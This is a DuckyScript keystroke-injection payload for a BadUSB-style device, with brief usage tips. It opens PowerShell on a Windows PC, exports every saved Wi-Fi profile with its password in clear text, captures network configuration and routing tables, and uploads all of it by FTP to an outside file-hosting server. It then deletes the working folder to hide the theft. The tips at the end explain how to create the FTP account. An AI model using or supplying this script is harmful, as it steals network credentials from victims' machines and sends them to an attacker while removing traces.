### This script get all info about wifi and password of saved networks and remove the directory used

    DELAY 1000
    GUI r
    DELAY 300
    STRING powershell
    ENTER
    DELAY 700
    STRING cd $ENV:UserProfile
    DELAY 100
    ENTER
    STRING mkdir tmp
    ENTER
    DELAY 800
    STRING cd tmp
    ENTER
    DELAY 800
    STRING netsh wlan export profile key=clear
    ENTER
    DELAY 1500
    STRING ipconfig > ipc.txt
    ENTER
    DELAY 600
    STRING netstat -r > nr.txt
    ENTER
    DELAY 600
    STRING ftp ftp.drivehq.com
    ENTER
    DELAY 300
    STRING USERNAME_FTP_DRIVEHQ
    ENTER
    DELAY 300
    STRING PASSWORD_FTP_DRIVEHQ
    ENTER
    DELAY 300
    STRING prompt
    ENTER
    DELAY 400
    STRING mput *.*
    ENTER
    DELAY 300
    STRING quit
    ENTER
    DELAY 300
    STRING cd ..
    ENTER
    STRING Remove-Item -Recurse -Force tmp
    ENTER
    STRING exit
    ENTER

*  This code works well in my PC (if you need adjust delays)
*  Make a free ftp account here: https://www.drivehq.com
*  Change (of course) your username & password